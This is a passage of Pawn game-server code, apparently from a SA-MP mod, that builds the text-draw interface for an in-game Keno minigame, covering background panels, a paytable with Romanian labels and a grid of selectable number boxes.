	PlayerTextDrawSetShadow(playerid, KenoTD[9], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[9], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[9], 255);
	PlayerTextDrawFont(playerid, KenoTD[9], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[9], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[9], 0);

	KenoTD[10] = CreatePlayerTextDraw(playerid, 136.899780, 159.375000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[10], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[10], 79.000000, 155.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[10], 1);
	PlayerTextDrawColor(playerid, KenoTD[10], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[10], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[10], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[10], 255);
	PlayerTextDrawFont(playerid, KenoTD[10], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[10], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[10], 0);

	KenoTD[11] = CreatePlayerTextDraw(playerid, 137.899780, 160.250000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[11], 77.000000, 153.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[11], 1);
	PlayerTextDrawColor(playerid, KenoTD[11], 505290495);
	PlayerTextDrawSetShadow(playerid, KenoTD[11], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[11], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[11], 255);
	PlayerTextDrawFont(playerid, KenoTD[11], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[11], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[11], 0);

	KenoTD[12] = CreatePlayerTextDraw(playerid, 220.799865, 228.937500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[12], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[12], 266.000000, 9.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[12], 1);
	PlayerTextDrawColor(playerid, KenoTD[12], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[12], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[12], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[12], 255);
	PlayerTextDrawFont(playerid, KenoTD[12], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[12], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[12], 0);

	KenoTD[13] = CreatePlayerTextDraw(playerid, 219.600006, 229.437530, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[13], 268.000000, 8.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[13], 1);
	PlayerTextDrawColor(playerid, KenoTD[13], 154798335);
	PlayerTextDrawSetShadow(playerid, KenoTD[13], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[13], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[13], 255);
	PlayerTextDrawFont(playerid, KenoTD[13], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[13], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[13], 0);

	KenoTD[14] = CreatePlayerTextDraw(playerid, 496.899780, 121.925010, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[14], 38.000000, 52.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[14], 1);
	PlayerTextDrawColor(playerid, KenoTD[14], 1431920895);
	PlayerTextDrawSetShadow(playerid, KenoTD[14], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[14], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[14], 255);
	PlayerTextDrawFont(playerid, KenoTD[14], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[14], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[14], 0);

	KenoTD[15] = CreatePlayerTextDraw(playerid, 494.899780, 166.550018, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, KenoTD[15], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[15], 42.000000, 18.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[15], 1);
	PlayerTextDrawColor(playerid, KenoTD[15], 1431920895);
	PlayerTextDrawSetShadow(playerid, KenoTD[15], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[15], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[15], 255);
	PlayerTextDrawFont(playerid, KenoTD[15], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[15], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[15], 0);

	KenoTD[16] = CreatePlayerTextDraw(playerid, 497.299743, 168.262542, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, KenoTD[16], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[16], 37.000000, 15.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[16], 1);
	PlayerTextDrawColor(playerid, KenoTD[16], 774911487);
	PlayerTextDrawSetShadow(playerid, KenoTD[16], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[16], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[16], 255);
	PlayerTextDrawFont(playerid, KenoTD[16], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[16], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[16], 0);

	KenoTD[17] = CreatePlayerTextDraw(playerid, 148.500000, 162.437500, "Paytabble");
	PlayerTextDrawLetterSize(playerid, KenoTD[17], 0.453999, 0.773123);
	PlayerTextDrawAlignment(playerid, KenoTD[17], 1);
	PlayerTextDrawColor(playerid, KenoTD[17], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[17], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[17], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[17], 255);
	PlayerTextDrawFont(playerid, KenoTD[17], 0);
	PlayerTextDrawSetProportional(playerid, KenoTD[17], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[17], 0);

	KenoTD[18] = CreatePlayerTextDraw(playerid, 178.000000, 202.450012, "10_100.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[18], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[18], 2);
	PlayerTextDrawColor(playerid, KenoTD[18], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[18], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[18], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[18], 255);
	PlayerTextDrawFont(playerid, KenoTD[18], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[18], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[18], 0);

	KenoTD[19] = CreatePlayerTextDraw(playerid, 178.000000, 211.774993, "9_10.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[19], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[19], 2);
	PlayerTextDrawColor(playerid, KenoTD[19], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[19], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[19], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[19], 255);
	PlayerTextDrawFont(playerid, KenoTD[19], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[19], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[19], 0);

	KenoTD[20] = CreatePlayerTextDraw(playerid, 176.000000, 220.450042, "8_7.500.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[20], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[20], 2);
	PlayerTextDrawColor(playerid, KenoTD[20], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[20], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[20], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[20], 255);
	PlayerTextDrawFont(playerid, KenoTD[20], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[20], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[20], 0);

	KenoTD[21] = CreatePlayerTextDraw(playerid, 175.500000, 229.325103, "7_7.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[21], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[21], 2);
	PlayerTextDrawColor(playerid, KenoTD[21], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[21], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[21], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[21], 255);
	PlayerTextDrawFont(playerid, KenoTD[21], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[21], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[21], 0);

	KenoTD[22] = CreatePlayerTextDraw(playerid, 175.699920, 237.512542, "6_6.500.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[22], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[22], 2);
	PlayerTextDrawColor(playerid, KenoTD[22], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[22], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[22], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[22], 255);
	PlayerTextDrawFont(playerid, KenoTD[22], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[22], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[22], 0);

	KenoTD[23] = CreatePlayerTextDraw(playerid, 176.100006, 245.325012, "5_6.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[23], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[23], 2);
	PlayerTextDrawColor(playerid, KenoTD[23], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[23], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[23], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[23], 255);
	PlayerTextDrawFont(playerid, KenoTD[23], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[23], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[23], 0);

	KenoTD[24] = CreatePlayerTextDraw(playerid, 175.999908, 254.387451, "4_5.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[24], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[24], 2);
	PlayerTextDrawColor(playerid, KenoTD[24], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[24], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[24], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[24], 255);
	PlayerTextDrawFont(playerid, KenoTD[24], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[24], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[24], 0);

	KenoTD[25] = CreatePlayerTextDraw(playerid, 175.499938, 264.787445, "3_4.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[25], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[25], 2);
	PlayerTextDrawColor(playerid, KenoTD[25], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[25], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[25], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[25], 255);
	PlayerTextDrawFont(playerid, KenoTD[25], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[25], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[25], 0);

	KenoTD[26] = CreatePlayerTextDraw(playerid, 175.000000, 275.575042, "2_3.000.000");
	PlayerTextDrawLetterSize(playerid, KenoTD[26], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[26], 2);
	PlayerTextDrawColor(playerid, KenoTD[26], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[26], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[26], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[26], 255);
	PlayerTextDrawFont(playerid, KenoTD[26], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[26], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[26], 0);

	KenoTD[27] = CreatePlayerTextDraw(playerid, 173.500000, 284.325042, "1.-");
	PlayerTextDrawLetterSize(playerid, KenoTD[27], 0.202997, 0.453750);
	PlayerTextDrawAlignment(playerid, KenoTD[27], 2);
	PlayerTextDrawColor(playerid, KenoTD[27], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[27], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[27], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[27], 255);
	PlayerTextDrawFont(playerid, KenoTD[27], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[27], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[27], 0);

	KenoTD[28] = CreatePlayerTextDraw(playerid, 176.500000, 194.200042, "Bile____Castig");
	PlayerTextDrawLetterSize(playerid, KenoTD[28], 0.212500, 0.751250);
	PlayerTextDrawAlignment(playerid, KenoTD[28], 2);
	PlayerTextDrawColor(playerid, KenoTD[28], -1944183041);
	PlayerTextDrawSetShadow(playerid, KenoTD[28], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[28], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[28], 255);
	PlayerTextDrawFont(playerid, KenoTD[28], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[28], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[28], 0);

	KenoTD[29] = CreatePlayerTextDraw(playerid, 220.799591, 161.000152, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[29], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[29], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[29], 1);
	PlayerTextDrawColor(playerid, KenoTD[29], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[29], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[29], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[29], 255);
	PlayerTextDrawFont(playerid, KenoTD[29], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[29], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[29], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[29], true);

	KenoTD[30] = CreatePlayerTextDraw(playerid, 247.199432, 160.724975, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[30], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[30], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[30], 1);
	PlayerTextDrawColor(playerid, KenoTD[30], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[30], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[30], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[30], 255);
	PlayerTextDrawFont(playerid, KenoTD[30], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[30], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[30], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[30], true);

	KenoTD[31] = CreatePlayerTextDraw(playerid, 274.501373, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[31], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[31], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[31], 1);
	PlayerTextDrawColor(playerid, KenoTD[31], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[31], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[31], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[31], 255);
	PlayerTextDrawFont(playerid, KenoTD[31], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[31], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[31], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[31], true);

	KenoTD[32] = CreatePlayerTextDraw(playerid, 302.603088, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[32], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[32], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[32], 1);
	PlayerTextDrawColor(playerid, KenoTD[32], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[32], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[32], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[32], 255);
	PlayerTextDrawFont(playerid, KenoTD[32], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[32], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[32], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[32], true);

	KenoTD[33] = CreatePlayerTextDraw(playerid, 330.104766, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[33], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[33], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[33], 1);
	PlayerTextDrawColor(playerid, KenoTD[33], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[33], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[33], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[33], 255);
	PlayerTextDrawFont(playerid, KenoTD[33], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[33], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[33], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[33], true);

	KenoTD[34] = CreatePlayerTextDraw(playerid, 357.106414, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[34], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[34], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[34], 1);
	PlayerTextDrawColor(playerid, KenoTD[34], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[34], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[34], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[34], 255);
	PlayerTextDrawFont(playerid, KenoTD[34], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[34], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[34], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[34], true);

	KenoTD[35] = CreatePlayerTextDraw(playerid, 384.208068, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[35], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[35], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[35], 1);
	PlayerTextDrawColor(playerid, KenoTD[35], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[35], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[35], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[35], 255);
	PlayerTextDrawFont(playerid, KenoTD[35], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[35], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[35], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[35], true);

	KenoTD[36] = CreatePlayerTextDraw(playerid, 411.609741, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[36], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[36], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[36], 1);
	PlayerTextDrawColor(playerid, KenoTD[36], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[36], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[36], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[36], 255);
	PlayerTextDrawFont(playerid, KenoTD[36], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[36], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[36], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[36], true);

	KenoTD[37] = CreatePlayerTextDraw(playerid, 437.811248, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[37], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[37], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[37], 1);
	PlayerTextDrawColor(playerid, KenoTD[37], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[37], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[37], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[37], 255);
	PlayerTextDrawFont(playerid, KenoTD[37], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[37], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[37], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[37], true);

	KenoTD[38] = CreatePlayerTextDraw(playerid, 463.812866, 160.662445, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[38], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[38], 23.000000, 19.430009);
	PlayerTextDrawAlignment(playerid, KenoTD[38], 1);
	PlayerTextDrawColor(playerid, KenoTD[38], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[38], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[38], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[38], 255);
	PlayerTextDrawFont(playerid, KenoTD[38], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[38], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[38], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[38], true);

	KenoTD[39] = CreatePlayerTextDraw(playerid, 220.799591, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[39], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[39], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[39], 1);
	PlayerTextDrawColor(playerid, KenoTD[39], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[39], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[39], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[39], 255);
	PlayerTextDrawFont(playerid, KenoTD[39], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[39], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[39], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[39], true);

	KenoTD[40] = CreatePlayerTextDraw(playerid, 246.501159, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[40], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[40], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[40], 1);
	PlayerTextDrawColor(playerid, KenoTD[40], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[40], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[40], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[40], 255);
	PlayerTextDrawFont(playerid, KenoTD[40], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[40], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[40], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[40], true);

	KenoTD[41] = CreatePlayerTextDraw(playerid, 274.302856, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[41], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[41], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[41], 1);
	PlayerTextDrawColor(playerid, KenoTD[41], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[41], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[41], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[41], 255);
	PlayerTextDrawFont(playerid, KenoTD[41], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[41], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[41], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[41], true);

	KenoTD[42] = CreatePlayerTextDraw(playerid, 302.504577, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[42], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[42], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[42], 1);
	PlayerTextDrawColor(playerid, KenoTD[42], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[42], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[42], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[42], 255);
	PlayerTextDrawFont(playerid, KenoTD[42], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[42], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[42], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[42], true);

	KenoTD[43] = CreatePlayerTextDraw(playerid, 330.106262, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[43], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[43], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[43], 1);
	PlayerTextDrawColor(playerid, KenoTD[43], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[43], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[43], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[43], 255);
	PlayerTextDrawFont(playerid, KenoTD[43], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[43], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[43], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[43], true);

	KenoTD[44] = CreatePlayerTextDraw(playerid, 357.907958, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[44], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[44], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[44], 1);
	PlayerTextDrawColor(playerid, KenoTD[44], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[44], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[44], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[44], 255);
	PlayerTextDrawFont(playerid, KenoTD[44], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[44], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[44], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[44], true);

	KenoTD[45] = CreatePlayerTextDraw(playerid, 384.409576, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[45], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[45], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[45], 1);
	PlayerTextDrawColor(playerid, KenoTD[45], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[45], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[45], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[45], 255);
	PlayerTextDrawFont(playerid, KenoTD[45], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[45], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[45], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[45], true);

	KenoTD[46] = CreatePlayerTextDraw(playerid, 411.911254, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[46], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[46], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[46], 1);
	PlayerTextDrawColor(playerid, KenoTD[46], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[46], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[46], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[46], 255);
	PlayerTextDrawFont(playerid, KenoTD[46], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[46], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[46], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[46], true);

	KenoTD[47] = CreatePlayerTextDraw(playerid, 438.012847, 182.501464, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[47], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[47], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[47], 1);
	PlayerTextDrawColor(playerid, KenoTD[47], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[47], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[47], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[47], 255);
	PlayerTextDrawFont(playerid, KenoTD[47], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[47], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[47], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[47], true);

	KenoTD[48] = CreatePlayerTextDraw(playerid, 463.514404, 182.501464, "LD_SPAC:white");
